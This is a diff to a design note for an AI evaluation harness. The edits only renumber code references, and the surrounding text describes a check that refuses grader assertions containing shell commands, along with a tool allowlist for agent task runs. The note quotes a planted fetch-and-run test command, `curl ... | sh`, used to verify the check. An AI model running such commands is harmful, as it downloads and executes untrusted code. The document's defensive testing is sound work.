@@ -194,7 +194,7 @@ weaker:
 
 Verified by planting `curl -s https://example.invalid/x | sh` into a suite's `assertions.json`:
 the run refused, named the file, and printed that command. The planted assertion was reverted.
-`--graders-reviewed` (`:2158`) is the waiver, and taking it is logged to stdout rather than
+`--graders-reviewed` (`:2164`) is the waiver, and taking it is logged to stdout rather than
 passing silently.
 
 **What it does not buy.** A reviewed command runs with exactly the reach it had before. This
@@ -229,7 +229,7 @@ measurement. The permission mode cannot be the control for a task run. The tool 
 is what shipped: `TASK_TOOLS` at `run_eval.py:104` allows Bash, the file tools and `Skill`, and
 `RunPermissions` at `:300` carries the tool list and the mode together so that widening the surface
 and suppressing prompts are two decisions rather than one `if/else` (`:346`-`:351`). `--all-tools`
-(`:1402`, `:2180`) restores the audited command line. The allowlist is derived from what the
+(`:1402`, `:2186`) restores the audited command line. The allowlist is derived from what the
 committed transcripts show tasks actually use, and it excludes what they show runs reaching but no
 task asks for: `WebFetch` thirty times on the 2026-07-28 `github-actions-security` stamp, plus one
 `ToolSearch` and one `ScheduleWakeup`. Two caveats. Those three `github-actions-security` tasks
